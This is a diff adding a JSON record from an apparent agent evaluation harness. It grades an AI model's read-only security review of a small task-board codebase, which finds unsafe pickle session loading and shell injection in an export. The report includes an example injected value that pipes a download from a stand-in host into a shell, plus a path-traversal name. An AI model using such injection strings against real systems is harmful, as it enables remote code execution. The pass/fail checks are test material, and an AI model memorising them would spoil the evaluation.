@@ -1,0 +1,101 @@
+{
+  "case": "h5-review#t1",
+  "arm": "v2",
+  "model": "sonnet",
+  "checks": {
+    "read_only": true,
+    "names_pickle_session": true,
+    "names_command_injection": true,
+    "decoy_not_reported_as_vuln": true
+  },
+  "passed": true,
+  "score": 1.0,
+  "segments": 1,
+  "tools": {
+    "Bash": 2,
+    "Read": 1
+  },
+  "agent_calls": 0,
+  "agent_types": [],
+  "agent_descriptions": [],
+  "final": "Security review: working tree, 5 source files read in full, nothing modified, no tests or scanners run.\n\n**Verdict:** 2 confirmed, 1 needs validation, 1 rejected. The code has no auth layer yet, and the two serious bugs are both on user-controlled input.\n\n**Confirmed**\n\n- **[critical] F-001: Unsafe pickle deserialization of the session cookie.** `taskboard/session.py:13`, `load_session`.\n  - **Who and what:** Anyone who can send a `tb_session` cookie, signed in or not, controls the bytes passed to `pickle.loads(base64.urlsafe_b64decode(cookie))`.\n  - **Boundary broken:** Untrusted input should never be unpickled. The cookie is neither signed nor verified, and `dump_session` at `session.py:6` adds no MAC.\n  - **Impact:** A crafted pickle runs arbitrary code in the server process. Separately, any user can forge `{\"u\": \"<anyone>\"}`.\n  - **Evidence:** Read from the code. I did not run an exploit.\n  - **Fix:** Serialize with JSON instead of pickle. Sign the result with `notify.sign` and check it with `notify.verify`, or use a framework session, and verify the signature before parsing. Add a test that a tampered or unsigned cookie is rejected.\n\n- **[high] F-002: Shell command injection in the export.** `taskboard/exports.py:7-8`, `export_project`.\n  - **Who and what:** The user-typed `project` goes into `f\"zip -rq {archive} {attachments_dir}\"`, which runs with `shell=True`. `out_dir` and `attachments_dir` are also interpolated without quoting.\n  - **Example:** `project = \"x; curl evil|sh #\"` runs a command on the server. `project = \"../../x\"` also writes the archive outside `out_dir`.\n  - **Conditions:** Whoever can call the export with a chosen project name, which is a normal account. I haven't seen the caller, so I can't say whether further checks exist.\n  - **Fix:** Use `subprocess.run([\"zip\", \"-rq\", archive, attachments_dir], check=True)` without a shell. Validate `project` against something like `^[\\w-]+$`. Confirm the resolved archive path stays inside `out_dir`. Add a test with `;` and `../` in the name.\n\n**Needs validation**\n\n- **F-003 [medium]: No authorization or tenant scoping.**\n  - **Where:** `taskboard/queries.py:56-64` (`list_tasks`, `tasks_for_owner`).\n  - **What:** They return any project's or owner's tasks to any caller, and `exports.py` has no ownership check either.\n  - **Missing fact:** The calling layer. The repo has no web or route code, so I can't tell whether it enforces access.\n  - **Related:** `taskboard/notify.py:7` falls back to `\"dev-only-key\"` when `TB_SIGNING_KEY` is unset. If that happens in production, signatures are forgeable. Fail closed when the variable is missing.\n\n**Rejected**\n\n- **SQL injection in `queries.py:58-59`.** `sort` is mapped through the `SORT_COLUMNS` allowlist, and values are bound with `?`. `tests/test_basic.py` covers the `id; DROP TABLE tasks` case. The `db.py:24` insert is parameterized too.\n- **Timing attack in `notify.verify`.** It uses `hmac.compare_digest`, so there is no issue there.\n\n**Coverage**\n- **Checked, with findings:** authn/session, injection (shell), parsing (pickle), crypto/secrets defaults, and files/paths (zip output).\n- **Checked, clean:** SQL injection.\n- **Not checked:** authz/tenant, because there is no caller code to read.\n- **Not applicable (not in the repo):** CORS, CSP and cookie flags, CI and deploy config, and agent/LLM tools.\n- **Dependencies:** unknown. No manifest or lockfile exists, and I ran no advisory scanner.\n\nThis is not evidence of absence for anything outside the files read.",
+  "is_error": false,
+  "num_turns": 4,
+  "duration_ms": 21163,
+  "cost_usd": 0.082669,
+  "usage": {
+    "input_tokens": 6,
+    "cache_creation_input_tokens": 12459,
+    "cache_read_input_tokens": 104610,
+    "output_tokens": 2236
+  },
+  "model_usage": {
+    "claude-sonnet-5-5": {
+      "inputTokens": 6,
+      "outputTokens": 2236,
+      "cacheReadInputTokens": 104610,
+      "cacheCreationInputTokens": 12459,
+      "webSearchRequests": 0,
+      "costUSD": 0.082669,
+      "contextWindow": 200000,
+      "maxOutputTokens": 128000,
+      "thinkingTokens": 529,
+      "cacheCreationEphemeral5mInputTokens": 0,
+      "cacheCreationEphemeral1hInputTokens": 12459,
+      "canonicalModel": "claude-sonnet-5-5",
+      "provider": "firstParty",
+      "costBasis": "list"
+    }
+  },
+  "subagent_stats": {
+    "spawned": 0,
+    "requested": {
+      "background": 0,
+      "foreground": 0,
+      "unset": 0
+    },
+    "started_in_background": 0,
+    "max_depth": 0,
+    "spawned_by_subagents": 0,
+    "completed": 0,
+    "failed": 0,
+    "killed": {
+      "parent": 0,
+      "user": 0,
+      "system": 0
+    },
+    "refused": {
+      "depth_limit": 0,
+      "concurrency_limit": 0,
+      "budget": 0
+    },
+    "by_type": {}
+  },
+  "permission_denials": 0,
+  "wall_s": 22.2,
+  "claude_rc": 0,
+  "invalid": null,
+  "workspace": "/tmp/ult-live-h/h5-review#t1__v2",
+  "transcript": "/tmp/ult-live-h/h5-review#t1__v2.jsonl",
+  "arch": {
+    "new_counts": {},
+    "arch_findings": 0,
+    "arch_blocking": 0
+  },
+  "metrics": {
+    "pass": true,
+    "graders_pass": true,
+    "total_cost_usd": 0.082669,
+    "input_tokens": 6,
+    "output_tokens": 2236,
+    "cache_read_tokens": 104610,
+    "cache_write_tokens": 12459,
+    "turns": 4,
+    "subagents": 0,
+    "invalid": false,
+    "arch_measured": true,
+    "arch_blocking": 0,
+    "arch_findings": 0,
+    "total_tokens": 119311
+  }
+}
